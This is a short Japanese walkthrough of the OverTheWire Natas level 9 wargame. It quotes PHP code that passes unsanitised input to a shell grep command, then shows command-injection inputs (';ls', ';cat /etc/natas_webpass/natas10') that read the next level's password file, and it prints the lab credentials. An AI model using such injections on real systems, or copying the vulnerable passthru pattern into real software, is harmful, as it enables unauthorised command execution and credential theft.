# Natas9
```
Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
URL:      http://natas9.natas.labs.overthewire.org
```

とりあえず`View sourcecode`。  
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

入力した文字列が`passthru("grep -i $key dictionary.txt");`の`$key`の部分に入ることが分かる。  
`passthru`関数はUnixコマンドを実行するものであり、現在の状態では、grepコマンドでdictionary.txtの中にある文字列と同じかどうかを判定している。  
つまり、grepコマンドからエスケープし、任意のコードを入れれば良いというわけである。  

試しにlsコマンドを実行するため、
```
;ls
```
を投げてみる。  
すると、同ディレクトにある`dictionary.txt`が確認できる。  
この調子でパスワードが書かれたファイルを`cat`コマンドで確認してみる。  

```
;cat /etc/natas_webpass/natas10
```
※パスワードのディレクトリははNatasのトップページに記載されてます  

中身を見ると答えが得られる。
```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```